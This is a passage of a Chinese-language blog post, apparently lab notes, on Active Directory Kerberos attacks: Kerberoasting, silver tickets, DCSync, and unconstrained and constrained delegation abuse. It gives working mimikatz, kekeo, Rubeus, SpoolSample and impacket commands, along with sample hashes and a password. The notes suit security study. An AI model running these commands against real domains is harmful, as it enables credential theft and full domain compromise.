                      alt="image-20230406141242727"
                ></p>
<h2 id="TGS-REQ-amp-TGS-REP阶段攻击"><a href="#TGS-REQ-amp-TGS-REP阶段攻击" class="headerlink" title="TGS_REQ&amp;TGS_REP阶段攻击"></a>TGS_REQ&amp;TGS_REP阶段攻击</h2><h3 id="Kerberosast攻击"><a href="#Kerberosast攻击" class="headerlink" title="Kerberosast攻击"></a>Kerberosast攻击</h3><h6 id="前瞻知识"><a href="#前瞻知识" class="headerlink" title="前瞻知识"></a>前瞻知识</h6><p>SPN，是服务实例（http、mssql、mysql等服务）的唯一标识符</p>
<p>kerberos认证过程是使用SPN将服务实例与服务登录账户相关联</p>
<p>如果想使用Kerberos认证服务，必须正确的配置SPN</p>
<p>一个账户有多个SPN</p>
<h6 id="注册方式有两种："><a href="#注册方式有两种：" class="headerlink" title="注册方式有两种："></a>注册方式有两种：</h6><p>机器账户：一个服务的权限是Local System或者Network Service时，则SPN注册在机器账户下</p>
<p>域用户账户：当权限是一个域用户时，则SPN是注册在域用户账户下</p>
<p>注意攻击的是域用户</p>
<h6 id="判断指令"><a href="#判断指令" class="headerlink" title="判断指令"></a>判断指令</h6><p>域环境下执行<code>setspn -q */*</code></p>
<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN,默认有三个：</p>
<p>域控制器：CN&#x3D;DC,OU&#x3D;Domain Controllers,DC&#x3D;laosec,DC&#x3D;cn</p>
<p>域用户帐户：CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;laosec,DC&#x3D;cn</p>
<p>机器帐户：CN&#x3D;WIN7,CN&#x3D;Computers,DC&#x3D;laosec,DC&#x3D;cn</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405145700825.png"
                      alt="image-20230405145700825"
                ></p>
<h6 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h6><p>攻击者对一个域进行身份认证，然后获得TGT，用于之后的ST请求</p>
<p>攻击者使用TGT发出ST服务票据请求，获得特定形式的SPN，具有唯一性</p>
<p>ST服务票据以服务回复的形式发送回攻击者</p>
<p>攻击者从TGS_REP中提取加密的服务票证，利用离线破解就可以恢复明文密码</p>
<h6 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h6><p>使用mimikatz请求</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ask /target:SQLServer/mssql.hacker.lab:1433/MSSQL  请求服务票据</span><br><span class="line">Kerberos::list            列出服务票据</span><br><span class="line">l=kerberos::purge         清除所有票据</span><br><span class="line">kerberos::list /export    导出所有票据</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2670873-20220816105758937-1080046002.png"
                      alt="img"
                ></p>
<p>导出票据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405152303985.png"
                      alt="image-20230405152303985"
                ></p>
<p>破解票据</p>
<p>使用kerberosast中的tgsrepcrack.py破解</p>
<p><code>python3 tgsrepcrack.py wordlist.txt test.kirbi</code></p>
<p>即可破解出明文密码</p>
<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><p>可以说是为了找krbtgt的hash值，为后续黄金票据提供必要条件</p>
<p>黄金票据是伪造TGT，而白银票据是伪造ST</p>
<p>客户是带着ST，server对其进行认证，解密ST得到session key，key再解密就认证成功了，就允许访问服务了</p>
<p>所以我们能够明白，只要知道Server用户hash就可以伪造出一个ST，且不会经过KDC，这个票据只对部分服务有效</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件</span><br><span class="line">1.域名</span><br><span class="line">2.域sid</span><br><span class="line">3.目标服务器名</span><br><span class="line">4.可利用的服务</span><br><span class="line">5.服务账号的NTLM HASH</span><br><span class="line">6.需要伪造的用户名</span><br></pre></td></tr></table></figure></div>

<h6 id="基本信息获取（SID，所处域，服务器名，NTLM-HASH）-域控"><a href="#基本信息获取（SID，所处域，服务器名，NTLM-HASH）-域控" class="headerlink" title="基本信息获取（SID，所处域，服务器名，NTLM HASH）(域控)"></a>基本信息获取（SID，所处域，服务器名，NTLM HASH）(域控)</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SID和所处域参考上面</span><br><span class="line">whoami /user </span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">获取服务账号hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405154632357.png"
                      alt="image-20230405154632357"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405154752324.png"
                      alt="image-20230405154752324"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405154949583.png"
                      alt="image-20230405154949583"
                ></p>
<p>所有信息收集完全后就可以制作白银票据</p>
<p>先清除一下系统票据（域控）</p>
<p>klist purge</p>
<p>mimikatz</p>
<p>kerberos::purge</p>
<h6 id="伪造共享文件夹服务（cifs）权限，mimkatz-域内其他主机"><a href="#伪造共享文件夹服务（cifs）权限，mimkatz-域内其他主机" class="headerlink" title="伪造共享文件夹服务（cifs）权限，mimkatz(域内其他主机)"></a>伪造共享文件夹服务（cifs）权限，mimkatz(域内其他主机)</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist purge  清除票据（cmd）</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:cifs /rc4:509c91e48a75dab92d5ae7d888cebc8a /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:域名 /sid:域sid /target:目标服务器 /service:目标服务 /rc4:目标服务器的hash /user:xxx用户名 /ptt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405160752134.png"
                      alt="image-20230405160752134"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405160808470.png"
                      alt="image-20230405160808470"
                ></p>
<p>票据注入成功了，但是不知道为啥还是拒绝访问</p>
<h6 id="伪造LDAP服务权限"><a href="#伪造LDAP服务权限" class="headerlink" title="伪造LDAP服务权限"></a>伪造LDAP服务权限</h6><h6 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>制作一个票据（注意sid中要去掉末尾的-500），接下来就可以使用生成的票据进行攻击</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:ldap /rc4:509c91e48a75dab92d5ae7d888cebc8a /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">只需要把服务名改成/service:ldap即可</span><br><span class="line"></span><br><span class="line">参考:https://blog.csdn.net/weixin_39851261/article/details/112076055</span><br></pre></td></tr></table></figure></div>

<p>mimikatz使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hack-my.com /domain:hack-my.com /user:krbtgt</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync 向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。 需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户 只读域控制器默认不允许读取用户密码数据</span><br></pre></td></tr></table></figure></div>

<p>按理说就可以获得krbtgt的值了，像这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165048733.png"
                      alt="image-20230405165048733"
                ></p>
<p>但是我的报错了，出不来，不知道是不是环境问题</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165127338.png"
                      alt="image-20230405165127338"
                ></p>
<p>第二天再试一次就可以了，奇奇怪怪的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406135943742.png"
                      alt="image-20230406135943742"
                ></p>
<p>获得krbtgt的hash值就可以进行黄金票据的构造了</p>
<h3 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h3><p>在现实情况下，多个服务往往不能在一台机器中</p>
<p>比如，用户在使用服务A时，需要服务B上的数据，最简单的方式就是A帮B去请求返回相应的信息</p>
<p>而这个过程就称之为委派</p>
<p>委派攻击分为：非约束委派、约束委派、基于资源三种</p>
<h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>当一个服务servicel开启非约束委派后，用户user访问servicel后，servicel就保存user的TGT票据，然后servicel就可以用user的身份来访问域中user可以访问所有服务</p>
<p>如果域管理员访问了一个开启非约束委派的服务，那这个服务就会将域管理员的TGT保存在内存中，这样就可以获得域管理员权限了</p>
<p>实验环境：win2008 域内机器  win2012域控</p>
<p>win2008的Alice用户是普通域内机器，默认没开启委派</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406112617697.png"
                      alt="image-20230406112617697"
                ></p>
<p>接下来就要开启委派了，给域用户注册SPN</p>
<p>域控主机上执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -U -A priv/test Alice</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406112814369.png"
                      alt="image-20230406112814369"
                ></p>
<p>然后查看Alice，发现多了个委派，设置为非约束委派</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406113052810.png"
                      alt="image-20230406113052810"
                ></p>
<p>查询域内设置了非约束委派的服务账户</p>
<p>Alice上执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406115059827.png"
                      alt="image-20230406115059827"
                ></p>
<p>查询域内设置了非约束委派的机器账户</p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406115348386.png"
                      alt="image-20230406115348386"
                ></p>
<h6 id="接下来开始攻击-利用1"><a href="#接下来开始攻击-利用1" class="headerlink" title="接下来开始攻击  利用1"></a>接下来开始攻击  利用1</h6><p>可以让域管理员访问被控主机</p>
<p>前提：找到配置了非约束委派的机器Alice并获得了管理员权限</p>
<p>Alice的mimikatz执行，查看本地票据，导出，没有administrator</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406135014457.png"
                      alt="image-20230406135014457"
                ></p>
<p>回到域控执行，让域管理员访问Alice，就会在Alice主机中产生TGT票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\alice.hack-my.com</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406120142914.png"
                      alt="image-20230406120142914"
                ></p>
<p>回到Alice重新导出票据</p>
<p>但是不知道为什么还是没有administrator</p>
<p>只能看看别人的了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/v2-bcefc178a80cab8bb1a6792a7db72ff1_r.jpg"
                      alt="img"
                ></p>
<p>别人有admin</p>
<p>然后就利用下面这个命令，使用这个导出的票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;36eb98]-2-0-60a10000-Administrator@krbtgt-HAISHI.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>然后访问共享文件夹就可以访问得到了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\dc.hack-my.com\c$</span><br></pre></td></tr></table></figure></div>

<p>这种方式在实战情况下，除非域管理员连接过该服务，否则十分的鸡肋</p>
<h6 id="利用2"><a href="#利用2" class="headerlink" title="利用2"></a>利用2</h6><p>特定情况下可以利用打印机服务Spooler，让域控主动连接</p>
<p>主要原理就是强迫运行打印机服务（Print Spooler）的主机向目标主机发起Kerberos或者NTLM认证请求</p>
<p>因为在Spooler服务默认开启的情况下，域用户可以利用windows打印机系统远程协议（MS-RPRN）强制任何运行了Spooler服务的域内计算机通过Kerberos或NTLM对任何目标进行认证</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要</span><br><span class="line">administrator权限</span><br><span class="line">得到域用户的账户密码</span><br><span class="line">域控打开打印机服务</span><br></pre></td></tr></table></figure></div>

<h6 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>首先域控得先打开打印机服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406164452743.png"
                      alt="image-20230406164452743"
                ></p>
<p>有一种就是直接运行SpoolSample</p>
<p>指令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份</span><br></pre></td></tr></table></figure></div>

<p>这样就会生成一个票据，然后就和上面的一样了，导出票据，执行票据就行了</p>
<p>但是上面的票据，我实操没发现administraotr的票据</p>
<p>还有一种是使用Rubeus来监听的</p>
<p>先利用Rubeus在域用户主机上运行，需要本地管理员权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br><span class="line"># 我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT</span><br><span class="line"># /interval:1 设置监听间隔1秒</span><br><span class="line"># /filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT</span><br><span class="line"># DC$为域控的主机名字加$</span><br></pre></td></tr></table></figure></div>

<p>我的域用户主机rubeus运行不起来，应该要在域用户主机上生成</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406175636951.png"
                      alt="image-20230406175636951"
                ></p>
<p>这是别人的图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2e69c11052ca3f45e6ed166b0a86ed8f.png"
                      alt="img"
                ></p>
<p>然后利用SPoolSample让域控强制向本机验证身份</p>
<p>需要以域用户身份运行</p>
<p>具体操作</p>
<p>运行<code>runas /user:[http://haishi.com](https://link.zhihu.com/?target=http%3A//haishi.com)\many powershell</code>打开一个域用户权限的powershell</p>
<p>然后运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spoolsample.exe DC Alice</span><br><span class="line"># 表示利用打印服务强制让域控机向Alice主机验证身份，这样我们的Rubeus就可以监听到TGS了</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/ea7756068b739208f63908f1a2c2e4d0.png"
                      alt="img"
                ></p>
<p>这个加了换行，所以可以用python去掉换行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&quot;&quot;</span><br><span class="line">for line in open(&#x27;1.txt&#x27;,&#x27;r&#x27;):</span><br><span class="line">    data += line.strip(&#x27;\n&#x27;)</span><br><span class="line">with open(&quot;2.txt&quot;,&#x27;a&#x27;) as f:</span><br><span class="line">    f.write(data)</span><br><span class="line">print(&#x27;保存完毕&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>复制2.txt中的TGT</p>
<p>本地管理员权限运行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:2.txt中的TGT值</span><br></pre></td></tr></table></figure></div>

<p>然后mimikatz执行，就可以获取krbtgt的NTLM hash值了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:hack-my.com /all /csv&quot; exit</span><br></pre></td></tr></table></figure></div>

<p>然后也能用smbexec.py获取域控权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python smbexec.py -hashes :NTLM-HASH administrator@192.168.30.10</span><br></pre></td></tr></table></figure></div>

<h4 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>由于非约束委派的不安全性，微软在win2003中发布了约束委派功能，对Kerberos协议进行了拓展，引入了S4U协议：S4U2Self和S4U2proxy。</p>
<h6 id="S4U2Self：用于生成本身服务TGS票据"><a href="#S4U2Self：用于生成本身服务TGS票据" class="headerlink" title="S4U2Self：用于生成本身服务TGS票据"></a>S4U2Self：用于生成本身服务TGS票据</h6><p>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户的对当前受约束委派服务的票据TGS，改服务票据TGS包含了用户的相关信息，如用户的信息组等</p>
<h6 id="S4U2proxy：保证只能访问特定服务（最大区别）"><a href="#S4U2proxy：保证只能访问特定服务（最大区别）" class="headerlink" title="S4U2proxy：保证只能访问特定服务（最大区别）"></a>S4U2proxy：保证只能访问特定服务（最大区别）</h6><p>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务</p>
<p>在约束委派中，用户还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务作了限制</p>
<p>他不允许受委派的服务代表用户使用这个TGT去访问任意服务，而只能访问指定服务</p>
<h6 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h6><p>通过上述了解，如果我们获取了service1的权限之后，就可以伪造S4U先请求service1本身的一个ST，然后利用这个ST便可以伪造任意用户请求去获取service2的ST了</p>
<h6 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h6><p>对win2008设置约束委派，委派win2008可以访问DC的CIFS请求</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406210828223.png"
                      alt="image-20230406210828223"
                ></p>
<p>服务账户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406205915345.png"
                      alt="image-20230406205915345"
                ></p>
<p>然后利用adfind查询约束委派主机的机器用户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406210930711.png"
                      alt="image-20230406210930711"
                ></p>
<p>查询服务账户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406211118085.png"
                      alt="image-20230406211118085"
                ></p>
<h6 id="利用1"><a href="#利用1" class="headerlink" title="利用1"></a>利用1</h6><p>使用机器账户wein2008-web</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件</span><br><span class="line">administrator权限</span><br><span class="line">获取了位置了约束委派的服务账户或者机器账户的凭据、密码或者hash都可</span><br></pre></td></tr></table></figure></div>

<p>先通过mimikatz获取web的票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot;&quot;sekurlsa::tickets /export&quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406213220426.png"
                      alt="image-20230406213220426"
                ></p>
<p>然后再用kekeo申请服务票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:[0;3e7]-2-2-40e10000-WEB$@krbtgt-HACK-MY.COM.kirbi /user:Administrator@hack-my.com /service:cifs/DC.hack-my.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406213404970.png"
                      alt="image-20230406213404970"
                ></p>
<p>使用mimikatz导入票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@HACK-MY.com@HACK-MY.COM_cifs~DC.haishi.com@HACK-MY.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>之后<code>dir \\dc.hack-my.com\c$</code>就可以访问了</p>
<h6 id="利用2-1"><a href="#利用2-1" class="headerlink" title="利用2"></a>利用2</h6><p>使用机器账户的hash</p>
<p>要先获取机器账户的hash（mmimikatz）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot;&quot;sekurlsa::logonpasswords&quot;&quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406214505772.png"
                      alt="image-20230406214505772"
                ></p>
<p>使用kekeo请求win2008-web的TGT票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:win2008-web /domain:hack-my.com /NTLM:48b1ee6132349190ee7c47d4b5d91608&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406214622142.png"
                      alt="image-20230406214622142"
                ></p>
<p>伪造S4U请求，伪造Administrator用户权限访问受委派的CIFS服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 申请administrator权限的票据</span><br><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_win2008-web@HACK-MY.COM_krbtgt~hack-my.com@HACK-MY.COM.kirbi /user:Administrator /service:cifs/dc.hack-my.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406215440285.png"
                      alt="image-20230406215440285"
                ></p>
<p>然后使用mimikatz导入S4U2proxy阶段生成的ST，便可以进行成功的访问CIFS服务</p>
<p><code>dir \\dc.hack-my.com\c$</code></p>
<h6 id="利用3"><a href="#利用3" class="headerlink" title="利用3"></a>利用3</h6><p>在获取hash值之后</p>
<p>就可以利用impacket套件里面的getST直接获取shell</p>
<p>用getST申请服务票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.30.10 -spn CIFS/dc.hack-my.com -impersonate administrator hack-my.com/WIN2008-WEB$ -hashes :48b1ee6132349190ee7c47d4b5d91608</span><br></pre></td></tr></table></figure></div>

<p>然后就可以导入票据了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 wmiexec.py -k hack-my.com/administrator@dc.hack-my.com -no-pass -dc-ip 192.168.30.10</span><br><span class="line"></span><br><span class="line">或者（权限更高）</span><br><span class="line">python3 psexec.py -no-pass -k dc.hack-my.com -dc-ip 192.168.30.10</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>然后就可以远程连接了</p>
<p>注意这里需要将域名加入host中</p>
<p><code>192.168.30.10 dc.hack-my.com</code></p>
<h6 id="利用4"><a href="#利用4" class="headerlink" title="利用4"></a>利用4</h6><p>使用服务账户Alice</p>
<p>可以直接使用密码</p>
<p>首先利用kekeo申请TGT（ST）票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:Alice /domain:hack-my.com /password:Admin！@#45 /ticket:Alice.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>然后就可以利用这个TGT去伪造其他用户来申请一个TGS的票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo.exe &quot;Tgs::s4u /tgt:TGT_Alice@HACK-MY.COM_krbtgt~hack-my.com@HACK-MY.COM.kirbi /user:administrator@hack-my.com /service:cifs/dc.hack-my.com&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>然后就可以利用mimikatz将这个TGS票据导入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@hack-my.com@HACK-MY.COM_cifs~DC.hack-my.com@HACK-MY.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p>然后就可以访问</p>
<p><code>dir \\dc.hack-my.com\c$</code></p>
<p>还有就是一个获取服务账户的hash来进行的，和上面的差不多就不说了</p>
<h4 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h4><p>基于资源的约束性委派是在win2012中加入的，和传统的委派相比，不需要域管理员权限去设置相关属性</p>
<p>基于资源的约束委派允许资源配置受信任的账户委派给他们</p>
<p>基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员</p>
<p>这是因为上面的特性，这就导致了正常只要是域用户都有权限进行委派的操作</p>
<h6 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h6><p>委派的权限给到了拥有资源的后端，而不再是赋值的前端</p>
<p>可以跨域和林委派</p>
<p>不用域管理员权限设置委派，只需拥有将计算机加入域的域用户和机器自身拥有的权限</p>
